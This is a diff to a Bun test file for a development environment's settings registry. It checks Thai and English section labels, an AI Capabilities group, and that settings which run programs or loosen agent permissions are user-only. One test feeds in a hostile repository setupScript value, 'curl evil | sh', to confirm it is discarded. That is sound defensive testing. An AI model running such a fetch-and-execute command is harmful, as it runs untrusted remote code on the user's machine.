@@ -1,7 +1,8 @@
 import { describe, expect, test } from 'bun:test';
 import { resolveSettings, SCHEMA, SETTINGS, settingProblems, settingsSections, validate } from '../registry';
-import { ADE_SECTION_GROUPS, ADE_SETTINGS, SYSTEM_SECTION_GROUPS } from './index';
-import { ORCA_MAP } from './orcaMap';
+import { ADE_SECTION_GROUPS, ADE_SETTINGS, AI_SECTION_GROUPS, SYSTEM_SECTION_GROUPS } from './index';
+import { ORCA_AI_CAPABILITIES, ORCA_MAP } from './orcaMap';
+import { t, tIn } from '../../i18n/index';
 
 /** A row's Kingu key as a matcher: `<profile>` and `.*` stand for any segment(s). */
 const matcher = (key: string) => new RegExp(`^${key.replace(/\./g, '\\.').replace('<profile>', '[a-z-]+').replace('\\.*', '\\..+')}$`);
@@ -15,7 +16,7 @@ describe('ADE settings registry (Orca settings as kingu.*)', () => {
 			// Thai first: the Thai text comes before the closing English sentence in parentheses.
 			expect([s.id, s.description.search(/[฀-๿]/) < s.description.lastIndexOf(' (')]).toEqual([s.id, true]);
 			expect([s.id, validate(s, s.default) !== undefined]).toEqual([s.id, true]);
-			expect([s.id, [...ADE_SECTION_GROUPS, ...SYSTEM_SECTION_GROUPS].includes(s.group)]).toEqual([s.id, true]);
+			expect([s.id, [...AI_SECTION_GROUPS, ...ADE_SECTION_GROUPS, ...SYSTEM_SECTION_GROUPS].includes(s.group)]).toEqual([s.id, true]);
 			expect([s.id, sections.some((sec) => sec.groups.includes(s.group))]).toEqual([s.id, true]);
 			if ('enumDescriptions' in s && s.enumDescriptions) expect([s.id, s.enumDescriptions.length]).toEqual([s.id, s.enum!.length]);
 		}
@@ -38,6 +39,7 @@ describe('ADE settings registry (Orca settings as kingu.*)', () => {
 	test('what runs programs, sets agent flags or disables protections is user-only (or yours per repository)', () => {
 		const userOnly = [
 			'kingu.agent.cmdOverrides',
+			'kingu.agent.cliPermissions',
 			'kingu.agent.claudeAgentTeams',
 			'kingu.git.ai.agent',
 			'kingu.git.ai.model',
@@ -48,7 +50,7 @@ describe('ADE settings registry (Orca settings as kingu.*)', () => {
 			'kingu.agent.notifications.hiddenWorkspaces',
 			...SETTINGS.filter((s) => s.id.startsWith('kingu.agent.env.')).map((s) => s.id)
 		];
-		const yours = ['kingu.repo.setupScript', 'kingu.repo.archiveScript', 'kingu.repo.issueCommand', 'kingu.repo.scriptSource', 'kingu.repo.symlinkPaths', 'kingu.git.ai.commitInstructions', 'kingu.git.ai.prInstructions'];
+		const yours = ['kingu.repo.setupScript', 'kingu.repo.archiveScript', 'kingu.repo.issueCommand', 'kingu.repo.scriptSource', 'kingu.repo.symlinkPaths', 'kingu.git.ai.commitInstructions', 'kingu.git.ai.prInstructions', 'kingu.git.ai.branchNameInstructions'];
 		for (const id of userOnly) expect([id, SCHEMA.get(id)?.scope]).toEqual([id, 'application']);
 		for (const id of yours) expect([id, SCHEMA.get(id)?.scope]).toEqual([id, 'local']);
 		// The repository's .kingu/settings.json sets none of them; the problems list says why.
@@ -57,5 +59,53 @@ describe('ADE settings registry (Orca settings as kingu.*)', () => {
 		for (const id of [...userOnly, ...yours]) expect([id, problems.some((p) => p.id === id)]).toEqual([id, true]);
 		const m = resolveSettings({}, { 'kingu.repo.setupScript': 'curl evil | sh', 'kingu.agent.cmdOverrides': { claude: '/tmp/x' } });
 		expect([m.get('kingu.repo.setupScript')?.value, m.get('kingu.agent.cmdOverrides')?.value]).toEqual(['', {}]);
+	});
+});
+
+describe("Orca's AI Capabilities group", () => {
+	const ai = () => settingsSections().find((s) => s.id === 'ai')!;
+
+	test('is the first section, with its Thai label, AI pages and groups; no other section holds them', () => {
+		const sections = settingsSections();
+		expect(sections[0].id).toBe('ai');
+		expect(ai().labelKey).toBe('settings.sections.aiCapabilities');
+		expect(t('settings.sections.aiCapabilities')).toBeTruthy();
+		expect(ai().pages).toEqual(['accounts', 'mcp', 'skills', 'memories', 'voice']);
+		expect(ai().groups).toEqual(AI_SECTION_GROUPS);
+		for (const g of AI_SECTION_GROUPS) expect([g, sections.filter((s) => s.groups.includes(g)).map((s) => s.id)]).toEqual([g, ['ai']]);
+	});
+
+	test('every section header goes through t(), so the AI one follows the UI language like the rest', () => {
+		for (const sec of settingsSections()) {
+			expect([sec.id, !!sec.labelKey]).toEqual([sec.id, true]);
+			expect(tIn('th', sec.labelKey!)).toBeTruthy();
+			expect(tIn('en', sec.labelKey!)).toBeTruthy();
+		}
+		expect(tIn('th', 'settings.sections.aiCapabilities')).toBe('ความสามารถ AI (AI Capabilities)');
+		expect(tIn('th', 'settings.sections.system')).toBe('ระบบ (System)');
+	});
+
+	test('every Orca capability setting has a map row, and its kingu.* key lives in the AI section', () => {
+		expect(ORCA_AI_CAPABILITIES.map((p) => p.pane)).toEqual(['Agents', 'AI Provider Accounts', 'Orchestration', 'Linear', 'Computer Use', 'Voice']);
+		for (const { pane, settings } of ORCA_AI_CAPABILITIES) {
+			for (const orca of settings) {
+				const rows = ORCA_MAP.filter(([o]) => o === orca);
+				expect([pane, orca, rows.length > 0]).toEqual([pane, orca, true]);
+				for (const [, key, status] of rows) {
+					if (!key?.startsWith('kingu.') || (status !== 'added' && status !== 'mapped')) continue;
+					const ids = SETTINGS.filter((s) => matcher(key).test(s.id));
+					expect([orca, ids.length > 0, ids.every((s) => ai().groups.includes(s.group))]).toEqual([orca, true, true]);
+				}
+			}
+		}
+		expect(ORCA_AI_CAPABILITIES.find((p) => p.pane === 'Voice')!.settings.length).toBe(9);
+	});
+
+	test('Agent Permissions: user-only, manual by default (Orca ships yolo)', () => {
+		const s = SCHEMA.get('kingu.agent.cliPermissions')!;
+		expect([s.default, s.scope, s.group]).toEqual(['manual', 'application', 'Agent']);
+		expect(resolveSettings({}, { 'kingu.agent.cliPermissions': 'yolo' }).get('kingu.agent.cliPermissions')).toEqual({ value: 'manual', source: 'default' });
+		expect(resolveSettings({ 'kingu.agent.cliPermissions': 'yolo' }, {}).get('kingu.agent.cliPermissions')?.value).toBe('yolo');
+		expect(SCHEMA.get('kingu.keepAwake')?.group).toBe('Agent');
 	});
 });
